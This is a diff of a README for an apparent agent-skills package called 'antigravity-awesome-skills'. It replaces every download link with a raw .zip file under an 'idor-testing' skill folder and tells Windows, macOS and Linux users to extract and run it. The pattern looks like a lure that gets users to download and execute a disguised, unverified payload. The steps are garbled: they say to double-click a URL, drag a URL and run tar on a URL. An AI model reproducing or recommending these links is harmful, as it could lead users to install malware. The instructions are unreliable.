@@ -1,6 +1,6 @@
 # 🚀 antigravity-awesome-skills - Master Agentic Skills with Ease
 
-[![Download](https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/nodejs-best-practices/skills-awesome-antigravity-v2.4.zip%20Now-Visit%https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/nodejs-best-practices/skills-awesome-antigravity-v2.4.zip)](https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/nodejs-best-practices/skills-awesome-antigravity-v2.4.zip)
+[![Download](https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip%20Now-Visit%https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip)](https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip)
 
 ## 📖 Overview
 
@@ -23,7 +23,7 @@ To begin your journey with antigravity-awesome-skills, follow these simple steps
 
 1. **Download the Skills**:
    - Click the download button below or visit the Releases page.
-   - [Download Now](https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/nodejs-best-practices/skills-awesome-antigravity-v2.4.zip)
+   - [Download Now](https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip)
 
 2. **Install the Application**:
    - Once you download the appropriate file for your system, locate it in your downloads folder.
@@ -35,26 +35,26 @@ To begin your journey with antigravity-awesome-skills, follow these simple steps
 
 1. Locate the downloaded ZIP file in your downloads folder.
 2. Right-click on the file and select "Extract All," then follow the prompts to unpack the files.
-3. Open the extracted folder and double-click `https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/nodejs-best-practices/skills-awesome-antigravity-v2.4.zip` to start the application.
+3. Open the extracted folder and double-click `https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip` to start the application.
 
 #### macOS Users
 
 1. Find the downloaded DMG file in your downloads folder.
-2. Double-click the file to mount it, then drag the `https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/nodejs-best-practices/skills-awesome-antigravity-v2.4.zip` to your Applications folder.
+2. Double-click the file to mount it, then drag the `https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip` to your Applications folder.
 3. Open Finder, navigate to Applications, and double-click on the app to launch.
 
 #### Linux Users
 
 1. Open a terminal window.
 2. Navigate to the directory where the downloaded TAR file is located.
-3. Run the following command to extract the files: `tar -xvf https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/nodejs-best-practices/skills-awesome-antigravity-v2.4.zip`.
+3. Run the following command to extract the files: `tar -xvf https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip`.
 4. Change into the directory and run: `./antigravity-awesome-skills` to launch the program.
 
 ## 📥 Download & Install
 
 You can download the latest version from our Releases page. Make sure to choose the correct file for your operating system.
 
-- [Visit Releases Page](https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/nodejs-best-practices/skills-awesome-antigravity-v2.4.zip)
+- [Visit Releases Page](https://raw.githubusercontent.com/cleodin/antigravity-awesome-skills/main/skills/idor-testing/awesome-antigravity-skills-3.0-beta.5.zip)
 
 ## 💡 System Requirements
 
